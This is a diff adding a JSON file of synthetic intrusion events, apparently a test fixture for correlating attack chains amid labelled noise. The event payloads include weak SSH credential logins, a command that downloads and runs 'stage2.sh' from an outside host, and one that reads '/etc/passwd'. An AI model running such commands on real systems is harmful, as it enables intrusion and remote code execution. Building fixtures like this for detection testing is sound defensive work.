@@ -1,0 +1,145 @@
+[
+  {
+    "event_id": "evt_stoch_a_1",
+    "timestamp": 1700000000.0121267,
+    "real_timestamp": 1700000000.0,
+    "source_ip": "198.51.76.42",
+    "target_node": "node_01",
+    "service": "http",
+    "event_type": "web_probe",
+    "payload": "GET /setup.php HTTP/1.1",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_a_2",
+    "timestamp": 1700000043.740014,
+    "real_timestamp": 1700000043.7324343,
+    "source_ip": "198.51.76.42",
+    "target_node": "node_01",
+    "service": "ssh",
+    "event_type": "auth_login",
+    "payload": "LOGIN admin / admin123",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_a_3",
+    "timestamp": 1700000107.7664459,
+    "real_timestamp": 1700000107.7613826,
+    "source_ip": "198.51.76.42",
+    "target_node": "node_01",
+    "service": "ssh",
+    "event_type": "command_exec",
+    "payload": "curl -O http://cdn.io/stage2.sh && bash stage2.sh",
+    "causal_token": "token-jump-pivot-529"
+  },
+  {
+    "event_id": "evt_stoch_b_1",
+    "timestamp": 1700000037.261268,
+    "real_timestamp": 1700000037.2571878,
+    "source_ip": "203.0.87.88",
+    "target_node": "node_02",
+    "service": "ssh",
+    "event_type": "port_scan",
+    "payload": "TCP SYN probe port 22",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_b_2",
+    "timestamp": 1700000075.457231,
+    "real_timestamp": 1700000075.4456959,
+    "source_ip": "203.0.87.88",
+    "target_node": "node_02",
+    "service": "ssh",
+    "event_type": "auth_login",
+    "payload": "LOGIN root / 123456",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_b_3",
+    "timestamp": 1700000109.4847968,
+    "real_timestamp": 1700000109.474673,
+    "source_ip": "203.0.87.88",
+    "target_node": "node_02",
+    "service": "ssh",
+    "event_type": "auth_login",
+    "payload": "LOGIN root / password",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_b_4",
+    "timestamp": 1700000169.2253926,
+    "real_timestamp": 1700000169.2144685,
+    "source_ip": "203.0.87.88",
+    "target_node": "node_02",
+    "service": "ssh",
+    "event_type": "command_exec",
+    "payload": "uname -a && cat /etc/passwd",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_1",
+    "timestamp": 1700000230.540604,
+    "real_timestamp": 1700000230.5323906,
+    "source_ip": "198.18.201.1",
+    "target_node": "node-1",
+    "service": "http",
+    "event_type": "web_probe",
+    "payload": "GET /robots.txt HTTP/1.1",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_2",
+    "timestamp": 1700000048.6951957,
+    "real_timestamp": 1700000048.6934915,
+    "source_ip": "198.18.213.2",
+    "target_node": "node-2",
+    "service": "ntp",
+    "event_type": "port_scan",
+    "payload": "TCP SYN probe",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_3",
+    "timestamp": 1700000036.7766855,
+    "real_timestamp": 1700000036.7767498,
+    "source_ip": "198.18.217.3",
+    "target_node": "node-3",
+    "service": "ntp",
+    "event_type": "web_probe",
+    "payload": "GET /robots.txt HTTP/1.1",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_4",
+    "timestamp": 1700000279.4693637,
+    "real_timestamp": 1700000279.4671502,
+    "source_ip": "198.18.244.4",
+    "target_node": "node-1",
+    "service": "http",
+    "event_type": "port_scan",
+    "payload": "TCP SYN probe",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_5",
+    "timestamp": 1700000121.002192,
+    "real_timestamp": 1700000121.0039995,
+    "source_ip": "198.18.250.5",
+    "target_node": "node-2",
+    "service": "ssh",
+    "event_type": "web_probe",
+    "payload": "GET /robots.txt HTTP/1.1",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_6",
+    "timestamp": 1700000272.612661,
+    "real_timestamp": 1700000272.6086485,
+    "source_ip": "198.18.233.6",
+    "target_node": "node-3",
+    "service": "ssh",
+    "event_type": "port_scan",
+    "payload": "TCP SYN probe",
+    "causal_token": null
+  }
+]
